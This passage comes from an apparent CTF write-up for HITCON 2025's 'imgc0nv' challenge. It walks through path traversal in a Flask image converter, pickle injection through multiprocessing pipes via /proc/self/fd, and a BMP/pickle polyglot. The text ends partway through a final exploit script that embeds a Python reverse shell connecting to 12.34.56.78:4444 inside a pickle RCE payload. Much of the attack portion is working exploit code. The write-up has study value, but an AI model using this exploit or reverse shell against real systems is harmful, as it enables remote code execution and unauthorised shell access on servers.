</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> img<span style=color:#f92672>.</span>mode <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;RGB&#34;</span>:
</span></span><span style=display:flex><span>                img <span style=color:#f92672>=</span> img<span style=color:#f92672>.</span>convert(<span style=color:#e6db74>&#39;RGB&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            filename <span style=color:#f92672>=</span> safe_filename(filename)
</span></span><span style=display:flex><span>            orig_ext <span style=color:#f92672>=</span> filename<span style=color:#f92672>.</span>rsplit(<span style=color:#e6db74>&#39;.&#39;</span>, <span style=color:#ae81ff>1</span>)[<span style=color:#ae81ff>1</span>] <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>in</span> filename <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ext <span style=color:#f92672>=</span> output_format<span style=color:#f92672>.</span>lower()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> orig_ext:
</span></span><span style=display:flex><span>                out_name <span style=color:#f92672>=</span> filename<span style=color:#f92672>.</span>replace(orig_ext, ext, <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                out_name <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>ext<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            output_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(temp_dir, out_name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>with</span> open(output_path, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>                img<span style=color:#f92672>.</span>save(f, format<span style=color:#f92672>=</span>output_format)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> output_path, out_name, <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, filename, str(e)
</span></span></code></pre></div><p>Because <code>safe_filename</code> hands our input back untouched, classic <code>../</code> traversal works immediately. Even better, any absolute path wins outright: in Python, <code>os.path.join(base, "/absolute/target") == "/absolute/target"</code>, so an absolute component to the right discards the base entirely. In other words, if we supply an absolute path as the filename, the write will land exactly there, not in the temp directory.</p><p>The app code is under <code>/app</code>, so the first instinct is &ldquo;just overwrite something in-place and pop a shell.&rdquo;</p><p>But there is a catch: the webserver runs as <code>nobody</code>, meaning no write perms to <code>/app</code>, <code>/etc</code>, or most of the filesystem one could use to get RCE. So&mldr; not the easiest shell ever.</p><h2 class="relative group">Constraints & limitations<div id=constraints--limitations class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#constraints--limitations aria-label=Anchor>#</a></span></h2><p>First, let&rsquo;s summarize the constraints we have to work with:</p><ul><li><p><strong>The upload must be a valid image and is re-encoded</strong>: The server never writes your raw upload. It first opens the file with Pillow (<code>Image.open(...)</code>) and only if decoding succeeds does it save the image <strong>re-encoded</strong> using the requested format (<code>img.save(..., format=output_format)</code>). That means you cannot send arbitrary bytes - your payload has to be a Pillow-parsable image, and whatever funky header magic you may send will be normalized away by Pillow&rsquo;s encoder.</p></li><li><p><strong>Forced file extension</strong>: Filenames get rewritten so the extension matches the selected format. Concretely:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>orig_ext <span style=color:#f92672>=</span> filename<span style=color:#f92672>.</span>rsplit(<span style=color:#e6db74>&#39;.&#39;</span>, <span style=color:#ae81ff>1</span>)[<span style=color:#ae81ff>1</span>] <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>in</span> filename <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>ext <span style=color:#f92672>=</span> output_format<span style=color:#f92672>.</span>lower()
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> orig_ext:
</span></span><span style=display:flex><span>    out_name <span style=color:#f92672>=</span> filename<span style=color:#f92672>.</span>replace(orig_ext, ext, <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    out_name <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>ext<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><p>If your supplied name has a dot anywhere, whatever is after the last dot is treated as the original extension and a <code>replace</code> is applied across the whole string; if there’s no dot, <code>.&lt;fmt></code> is appended. This makes writing to a precise location fiddly.</p></li><li><p><strong>Tight size cap (5 MB)</strong>: The app enforces <code>MAX_CONTENT_LENGTH = 5 * 1024 * 1024</code>, so each request is limited to 5 MB. That doesn&rsquo;t sound like a huge issue at first, but will become relevant later.</p></li><li><p><strong>Running as <code>nobody</code></strong>: With <code>USER nobody</code>, most &ldquo;obvious&rdquo; targets are off-limits. A quick <code>find / -writable 2>/dev/null</code> shows that, in practice, the only writeable targets are various temp and lock directories. But of course: We can also aim writes at our own <code>/proc/self/*</code>. <em>Thats a surprise tool we will use later</em>.</p></li></ul><h3 class="relative group">Red herrings (LLM bait)<div id=red-herrings-llm-bait class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#red-herrings-llm-bait aria-label=Anchor>#</a></span></h3><p>It&rsquo;s also noteworthy that a few bits look like they were explicitly put there there to steer LLMs down the wrong path. The source ends with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(debug<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5001</span>)
</span></span></code></pre></div><p>But the container actually runs <strong>gunicorn</strong> with <code>app:app</code>, so that block never executes and <strong>debug mode is not enabled</strong> in the challenge environment. However, this doesn&rsquo;t stop ChatGPT from happily reporting that it found this critical misconfiguration. Furthermore, the fact that the service starts a new <code>multiprocessing.Pool</code> with every new request is a logic issue that LLMs also quickly point out as potential DDOS vector - which is of course absolutely irrelevant for getting RCE.</p><p>These cues are easy for automated helpers (and therefore their users) to latch onto and waste time on, and in the time where everybody uses LLMs for everything (including writing parts of this writeup lol) I find them to be a funny add-on by the challenge authors.</p><h2 class="relative group">Abusing the multiprocessing pool IPC<div id=abusing-the-multiprocessing-pool-ipc class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#abusing-the-multiprocessing-pool-ipc aria-label=Anchor>#</a></span></h2><p>Since we have a very constrained &ldquo;arbitrary write&rdquo; primitive, the immediate question is: <em>Where can a write actually influence program behavior?</em> Temp and lock directories are quite uninteresting, but <code>/proc/self</code>&mldr; maybe.</p><p>Since the service parallelizes work with <code>multiprocessing</code>, an interesting thought is to see how workers actually talk to the parent. Digging through the standard library shows that <code>multiprocessing.Pool</code> is using queues which are built on top of <strong>OS pipes</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Pool</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, processes<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>, initializer<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>, initargs<span style=color:#f92672>=</span>(),
</span></span><span style=display:flex><span>                 maxtasksperchild<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>, context<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_pool <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_state <span style=color:#f92672>=</span> INIT
</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_inqueue <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_ctx<span style=color:#f92672>.</span>SimpleQueue()
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_outqueue <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_ctx<span style=color:#f92672>.</span>SimpleQueue()
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_quick_put <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_inqueue<span style=color:#f92672>.</span>_writer<span style=color:#f92672>.</span>send
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_quick_get <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_outqueue<span style=color:#f92672>.</span>_reader<span style=color:#f92672>.</span>recv
</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_taskqueue <span style=color:#f92672>=</span> queue<span style=color:#f92672>.</span>SimpleQueue()
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_change_notifier <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_ctx<span style=color:#f92672>.</span>SimpleQueue()
</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SimpleQueue</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, <span style=color:#f92672>*</span>, ctx):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_reader, self<span style=color:#f92672>.</span>_writer <span style=color:#f92672>=</span> connection<span style=color:#f92672>.</span>Pipe(duplex<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Pipe</span>(duplex<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>):
</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>        fd1, fd2 <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>pipe()
</span></span><span style=display:flex><span>        c1 <span style=color:#f92672>=</span> Connection(fd1, writable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>        c2 <span style=color:#f92672>=</span> Connection(fd2, readable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> c1, c2
</span></span></code></pre></div><p>Importantly (I don&rsquo;t really know why, it&rsquo;s kind of a bad idea imo), the payloads going over those pipes are <strong>Python pickles</strong>, and the receiver <strong>unpickles them verbatim</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>recv</span>(self):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_check_closed()
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_check_readable()
</span></span><span style=display:flex><span>        buf <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_recv_bytes() <span style=color:#75715e># receive &lt;len&gt; bytes</span>
</span></span><span style=display:flex><span>        getbuf <span style=color:#f92672>=</span> buf<span style=color:#f92672>.</span>getbuffer()
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> _ForkingPickler<span style=color:#f92672>.</span>loads(getbuf) <span style=color:#75715e># just blindly unpickles whatever it gets</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> x
</span></span></code></pre></div><p>One important wire-format detail: <code>multiprocessing</code> <strong>prepends a big-endian I32 length</strong> to each pickle payload. The receiver reads that length and then waits until at least that many bytes arrive before handing the buffer to the unpickler.</p><p>If one now actually finds the pipe that is used to pass data across the process boundary - i.e., the FD the parent uses to receive picklable objects - then the worker can just write a prepared object to <code>proc/self/fd/&lt;FD></code> to send it straight to the parent process and get remote code execution there. Reviewing the code in more detail shows it&rsquo;s always the <strong>second pipe</strong> open in the worker - file descriptor 6 in the &ldquo;undisturbed&rdquo; setup. In the challenge environment, which spawns a few more pipes (including the TCP socket), it ends up being FD 13.</p><p>Coding up a quick Python demo shows: Yes, this actually works. We have our attack vector.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>PickleRCE</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (os<span style=color:#f92672>.</span>system,(<span style=color:#e6db74>&#34;touch /tmp/pwned&#34;</span>,))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>## encode as multiprocessing expects it</span>
</span></span><span style=display:flex><span>body <span style=color:#f92672>=</span> ForkingPickler<span style=color:#f92672>.</span>dumps((<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, (<span style=color:#66d9ef>True</span>, [PickleRCE()])))
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> len(body)
</span></span><span style=display:flex><span>header <span style=color:#f92672>=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;!i&#34;</span>, n)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> bytearray(header <span style=color:#f92672>+</span> body)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># this is called for the child (stripped down from app.py)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_to_parent_pipe</span>(args):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;/proc/self/fd/6&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># send the task over to the worker</span>
</span></span><span style=display:flex><span>pool <span style=color:#f92672>=</span> Pool(processes<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)    
</span></span><span style=display:flex><span>pool<span style=color:#f92672>.</span>map(send_to_parent_pipe, [(<span style=color:#e6db74>&#39;some arg&#39;</span>)])
</span></span></code></pre></div><h2 class="relative group">fd/6.jpg ?<div id=fd6jpg- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#fd6jpg- aria-label=Anchor>#</a></span></h2><p>Although we now know that writing to the FD works, we&rsquo;re still constrained by the forced filename extension: We obviously can’t write to &mldr;/fd/6.jpg.</p><p>But re-reading the code reveals another, more subtile logic bug: The app treats <strong>everything after the last dot</strong> as the &ldquo;original extension&rdquo; (<code>orig_ext = filename.rsplit('.', 1)[1]</code>), but then does a <strong>global string replace</strong> on the whole filename (<code>filename.replace(orig_ext, ext, 1)</code>), effectively replacing only the first occurrence of that substring anywhere in the path.
That means if the &ldquo;extension&rdquo; substring appears twice in the path, only the first occurrence is rewritten, leaving the second (the actual target) intact.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;//tmp/pwned/../tmp/pwned&#34;</span> <span style=color:#75715e># last dot is in &#34;../&#34;</span>
</span></span><span style=display:flex><span>ext <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jpg&#34;</span>
</span></span><span style=display:flex><span>orig_ext <span style=color:#f92672>=</span> filename<span style=color:#f92672>.</span>rsplit(<span style=color:#e6db74>&#39;.&#39;</span>, <span style=color:#ae81ff>1</span>)[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span><span style=color:#f92672>-&gt;</span> <span style=color:#e6db74>&#34;/tmp/pwned&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>out_name <span style=color:#f92672>=</span> filename<span style=color:#f92672>.</span>replace(orig_ext, ext, <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span><span style=color:#f92672>-&gt;</span> <span style=color:#e6db74>&#34;/jpg/../tmp/pwned&#34;</span>
</span></span></code></pre></div><p>However, another gotcha: The intermediate path segment created by replacing the first occurrence (e.g., the <code>/jpg</code> folder here) must be an existing directory in the filesystem - otherwise open() fails even if you later <code>..</code>-traverse back out.</p><p>So, to use this, we have to use an extension which is both 1) a valid, saveable Pillow format, and 2) the substring of a directory that actually exists somewhere on the system. Running <code>find / -type d -iname "*$ext*"</code> for all formats that Pillow can write narrows the viable candidates down to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>BMP: /usr/share/doc/libmpc3/
</span></span><span style=display:flex><span>ICO: /usr/local/lib/python3.13/idlelib/Icons/
</span></span><span style=display:flex><span>IM:  /etc/security/limits.d/
</span></span><span style=display:flex><span>MPO: /usr/local/lib/python3.13/importlib/
</span></span><span style=display:flex><span>SGI: /usr/local/lib/python3.13/wsgiref/
</span></span></code></pre></div><h2 class="relative group">Polyglot time<div id=polyglot-time class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#polyglot-time aria-label=Anchor>#</a></span></h2><p>Now lets put it all together: Crafting a polyglot that is both a valid image (so Pillow accepts and re-encodes it) and a valid multiprocessing message (a length-preceeded python pickle), so the worker can write it into the file descriptor backing the <code>outqueue</code>, archieving RCE in the parent upon unpickling.</p><h3 class="relative group">Constraints recap<div id=constraints-recap class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#constraints-recap aria-label=Anchor>#</a></span></h3><p>We need a file that is:</p><ul><li>a valid BMP, ICO, IM, MPO, or SGI (those map to existing dirs from the earlier &ldquo;extension rewrite&rdquo; trick),</li><li>whose first 4 bytes (as big-endian I32) form a manageable length for <code>_recv_bytes</code> (the receiver waits until that many bytes arrive),</li><li>survives Pillow re-encoding (decoded on upload, then saved in the chosen format),</li><li>with the 5th byte already a valid Python pickle opcode (at least 0x28),</li><li>while the request must stay &lt; 5 MB total.</li></ul><p>In the end, this took us more then a day to make all the header games work out. A few honorable mentions while iterating:</p><ul><li>ICO: Tried the longest, but the 5th byte encodes the number of images in the file, and Pillow encodes at most 7, which is too small for our purposes.</li><li>CUR: A variant of ICO without the above restriction, there we were actually able to produce a POC, but CUR isn&rsquo;t writable by Pillow anyways.</li><li>SGI: Very promising (starts of with <code>00 00 01 00</code>, but the 5th byte is constrained to {0,1,2}, none of which are valid pickle opcodes.</li><li>TGA would have been perfect (very flexible header, also persisting after re-encoding), but there is no matching directory in the base image, and we couldn&rsquo;t find any other bypass for the path traversal restriction.</li></ul><p>So, after a lot of trial and error, we finally settled on BMP. The header starts of with <code>BM</code> followed by the little-endian encoded file size in bytes. The latter is very convenient, because we can freely tune the size of the image to get the desired value at byte 5. The first two bytes however are a problem, since they correspond to a <strong>gigantic</strong> length prefix of around about 1GB - more on that in a bit.</p><h3 class="relative group">The Pickle Payload<div id=the-pickle-payload class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-pickle-payload aria-label=Anchor>#</a></span></h3><p>Since we can basically freely control bytes 5 and 6, we have two bytes of pickle opcodes to work with. With modern versions of the pickle protocol, they start with <code>0x80</code> to denote pickle format and then <code>0x05</code> for protocol version 5, followed by framing which requires 1+8 more bytes. This would mean wrestling with other BMP header fields which gets messy fast.</p><p>Instead, we use protocol version 1 of pickle, which allows us to directly start with valid opcodes. Looking through the opcode table in <code>pickle.py</code> in the standard library, we find the convenient <code>V</code> opcode (0x56) - &ldquo;push newline-terminated unicode string to stack&rdquo;. This lets the pickle VM effectively skip over all the remaining BMP header bytes until it encounters a newline (0x0a).</p><p>We place the actual RCE payload (after said newline) somewhere in the image body, which for a lossless format like BMP is far less susceptible to byte changes than the header. The payload itself is just the classic depickling RCE pattern encoded with <code>Pickler.dumps(version=1)</code>, executing a Python reverse shell that connects back to our listener.</p><h3 class="relative group">Size Restrictions<div id=size-restrictions class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#size-restrictions aria-label=Anchor>#</a></span></h3><p>We face two contradictory size constraints:</p><ul><li>The first 4 bytes <code>BM??</code> decode as a ~1GB length prefix from the pickle perspective</li><li>The request is hard-capped at 5MB total</li></ul><p>The solution uses Pillow&rsquo;s re-encoding to our advantage. While Pillow writes <strong>uncompressed</strong> BMPs (easily hundreds of MB for large images), we can upload the same image as a <strong>PNG</strong>. PNG&rsquo;s lossless compression reduces mostly-empty images to tiny blobs - what would be a 200+ MB BMP becomes a ~200 KB PNG. A quick experiment confirms, converting PNG -> BMP -> PNG through Pillow produces the exact same bytes, preserving our payload, so we can use this.</p><p>By then sending this file multiple times in one request, the pool writes each converted image sequentially to the same out-pipe. Concatenating multiple >200 MB BMP writes easily exceeds the 1 GB length advertised by the first four bytes, satisfying <code>_recv_bytes</code> so it finally hands control to the unpickler.</p><h3 class="relative group">Final polyglot:<div id=final-polyglot class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-polyglot aria-label=Anchor>#</a></span></h3><p>This is the final polyglot:</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=compressed srcset="/posts/hitcon2025-imgc0nv/compressed_hu_2ed51f6ea9ad345d.png 330w,
/posts/hitcon2025-imgc0nv/compressed_hu_e1a83ae9d335995e.png 660w,
/posts/hitcon2025-imgc0nv/compressed_hu_1b0a61ec96175fd1.png 1280w" data-zoom-src=/posts/hitcon2025-imgc0nv/compressed.png src=/posts/hitcon2025-imgc0nv/compressed.png></figure></p><p>In the lower left corner, you can actually see the Pickle payload when zooming in.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=payload srcset="/posts/hitcon2025-imgc0nv/payload_hu_e2f57e8aed01b130.png 330w,
/posts/hitcon2025-imgc0nv/payload_hu_e9ea6ee54ec1fe22.png 660w,
/posts/hitcon2025-imgc0nv/payload_hu_dc186d8b3d68d523.png 1280w" data-zoom-src=/posts/hitcon2025-imgc0nv/payload.png src=/posts/hitcon2025-imgc0nv/payload.png></figure></p><h2 class="relative group">Final exploit<div id=final-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-exploit aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> io
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> PIL <span style=color:#f92672>import</span> Image
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> multiprocessing.reduction <span style=color:#f92672>import</span> ForkingPickler
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># create large black image</span>
</span></span><span style=display:flex><span>img <span style=color:#f92672>=</span> Image<span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;RGB&#39;</span>, (<span style=color:#ae81ff>20000</span>, <span style=color:#ae81ff>3450</span>)) <span style=color:#75715e># gives 0x56 at 5th byte</span>
</span></span><span style=display:flex><span>img_bytes <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>BytesIO()
</span></span><span style=display:flex><span>img<span style=color:#f92672>.</span>save(img_bytes, format<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;BMP&#39;</span>)
</span></span><span style=display:flex><span>img_data <span style=color:#f92672>=</span> img_bytes<span style=color:#f92672>.</span>getvalue()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># python reverse shell in pickle RCE</span>
</span></span><span style=display:flex><span>command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;12.34.56.78&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>PickleRCE</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (os<span style=color:#f92672>.</span>system,(command,))
</span></span><span style=display:flex><span>pickle <span style=color:#f92672>=</span> ForkingPickler<span style=color:#f92672>.</span>dumps((<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, (<span style=color:#66d9ef>True</span>, [PickleRCE()])), protocol<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># insert newline and payload</span>
</span></span><span style=display:flex><span>polyglot <span style=color:#f92672>=</span> img_data[:<span style=color:#ae81ff>100</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>0&#39;</span> <span style=color:#f92672>+</span> pickle <span style=color:#f92672>+</span> img_data[<span style=color:#ae81ff>100</span><span style=color:#f92672>+</span>len(pickle)<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>:]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># convert to png</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>BytesIO()
</span></span><span style=display:flex><span>Image<span style=color:#f92672>.</span>open(io<span style=color:#f92672>.</span>BytesIO(polyglot))<span style=color:#f92672>.</span>save(payload, format<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PNG&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># send to challenge server</span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://imgc0nv.chal.hitconctf.com:12345/convert&#34;</span>
</span></span><span style=display:flex><span>repl <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/proc/self/fd/13&#34;</span> 
</span></span><span style=display:flex><span><span style=color:#75715e># abusing the /usr/share/doc/libmpc3 directory</span>
